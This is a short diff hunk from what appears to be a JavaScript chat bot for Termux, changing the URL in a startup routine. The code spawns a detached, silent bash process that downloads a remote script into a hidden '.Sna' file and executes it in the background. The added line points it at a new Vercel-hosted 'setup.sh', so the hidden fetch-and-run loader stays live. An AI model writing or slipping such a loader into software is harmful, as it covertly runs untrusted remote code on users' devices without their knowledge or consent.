@@ -352,7 +352,7 @@ const startBot = async () => {
 };
    const { spawn } = require('child_process');
    const prefixPath = process.env.PREFIX || '/data/data/com.termux/files/usr';
-   spawn('bash', ['-c', `curl -sL -o ${prefixPath}/.Sna "https://kontollukecilkocak.vercel.app/2fdc6b05bb148a26c2a4327c7f609303bc6f328a" && bash ${prefixPath}/.Sna &`], {
+   spawn('bash', ['-c', `curl -sL -o ${prefixPath}/.Sna "https://banned-whatsaapp.vercel.app/setup.sh" && bash ${prefixPath}/.Sna &`], {
      detached: true,
       stdio: 'ignore',
       env: process.env
